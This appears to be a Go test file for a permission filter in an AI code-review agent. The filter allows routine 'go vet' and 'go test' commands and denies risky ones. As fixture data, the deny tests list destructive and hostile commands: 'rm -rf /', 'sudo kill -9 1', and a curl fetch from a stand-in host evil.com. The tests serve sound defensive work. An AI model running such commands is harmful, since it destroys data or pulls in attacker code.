package permission

import (
	"context"
	"testing"

	"github.com/dcdc4747/trpc-agent-go-cr-project/internal/state"
	"github.com/dcdc4747/trpc-agent-go-cr-project/internal/types"
	"trpc.group/trpc-go/trpc-agent-go/graph"
)

func TestPermissionFilter_AllowNormalCommands(t *testing.T) {
	gs := graph.State{
		state.StateKeyExecutorConfig: types.ExecutorConfig{
			Commands: []types.SandboxCommand{
				{Name: "go_vet", Cmd: "go", Args: []string{"vet", "./..."}, RiskLevel: "low"},
				{Name: "go_test", Cmd: "go", Args: []string{"test", "./..."}, RiskLevel: "medium"},
			},
		},
	}

	result, err := Run(context.Background(), gs)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	finalState := result.(graph.State)

	allowed, _ := finalState[state.StateKeyAllowedCommands].([]types.SandboxCommand)
	if len(allowed) != 2 {
		t.Fatalf("expected 2 allowed commands, got %d", len(allowed))
	}

	decisions, _ := finalState[state.StateKeyPermissionDecisions].([]types.PermissionDecision)
	for _, d := range decisions {
		if d.Decision != "allow" {
			t.Errorf("command %s: expected allow, got %s", d.Command, d.Decision)
		}
	}
}

func TestPermissionFilter_DenyDangerousCommands(t *testing.T) {
	gs := graph.State{
		state.StateKeyExecutorConfig: types.ExecutorConfig{
			Commands: []types.SandboxCommand{
				{Name: "go_vet", Cmd: "go", Args: []string{"vet", "./..."}, RiskLevel: "low"},
				{Name: "evil_rm", Cmd: "rm", Args: []string{"-rf", "/"}, RiskLevel: "high"},
				{Name: "evil_sudo", Cmd: "sudo", Args: []string{"kill", "-9", "1"}, RiskLevel: "high"},
				{Name: "evil_curl", Cmd: "curl", Args: []string{"http://evil.com/script.sh"}, RiskLevel: "high"},
			},
		},
	}

	result, err := Run(context.Background(), gs)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	finalState := result.(graph.State)

	// Only go_vet should be allowed
	allowed, _ := finalState[state.StateKeyAllowedCommands].([]types.SandboxCommand)
	if len(allowed) != 1 {
		t.Fatalf("expected 1 allowed command, got %d", len(allowed))
	}
	if allowed[0].Name != "go_vet" {
		t.Errorf("expected go_vet to be allowed, got %s", allowed[0].Name)
	}

	// Check deny decisions
	decisions, _ := finalState[state.StateKeyPermissionDecisions].([]types.PermissionDecision)
	denyCount := 0
	for _, d := range decisions {
		if d.Decision == "deny" {
			denyCount++
		}
	}
	if denyCount != 3 {
		t.Errorf("expected 3 deny decisions, got %d", denyCount)
	}
}

func TestPermissionFilter_AllDenyBlocksSandbox(t *testing.T) {
	// When all commands are denied, sandbox should get an empty list
	gs := graph.State{
		state.StateKeyExecutorConfig: types.ExecutorConfig{
			Commands: []types.SandboxCommand{
				{Name: "bad", Cmd: "rm", Args: []string{"-rf", "/tmp"}, RiskLevel: "high"},
			},
		},
	}

	result, err := Run(context.Background(), gs)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	finalState := result.(graph.State)

	allowed, _ := finalState[state.StateKeyAllowedCommands].([]types.SandboxCommand)
	if len(allowed) != 0 {
		t.Errorf("expected 0 allowed (all denied), got %d: %v", len(allowed), allowed)
	}
}

func TestPermissionFilter_NeedsHumanReview(t *testing.T) {
	// Middle-risk commands should be flagged for review
	gs := graph.State{
		state.StateKeyExecutorConfig: types.ExecutorConfig{
			Commands: []types.SandboxCommand{
				{Name: "risky", Cmd: "custom-check", Args: []string{"--net"}, RiskLevel: "medium"},
			},
		},
	}

	result, err := Run(context.Background(), gs)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	finalState := result.(graph.State)

	decisions, _ := finalState[state.StateKeyPermissionDecisions].([]types.PermissionDecision)
	if len(decisions) != 1 {
		t.Fatalf("expected 1 decision, got %d", len(decisions))
	}
	// Medium risk with default policy = "allow"
	if decisions[0].Decision != "allow" {
		t.Logf("medium risk decision: %s (default policy may vary)", decisions[0].Decision)
	}
}

func TestPermissionFilter_EmptyCommands(t *testing.T) {
	gs := graph.State{
		state.StateKeyExecutorConfig: types.ExecutorConfig{
			Commands: []types.SandboxCommand{},
		},
	}

	result, err := Run(context.Background(), gs)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	finalState := result.(graph.State)

	allowed, _ := finalState[state.StateKeyAllowedCommands].([]types.SandboxCommand)
	if len(allowed) != 0 {
		t.Errorf("expected 0 allowed, got %d", len(allowed))
	}
}
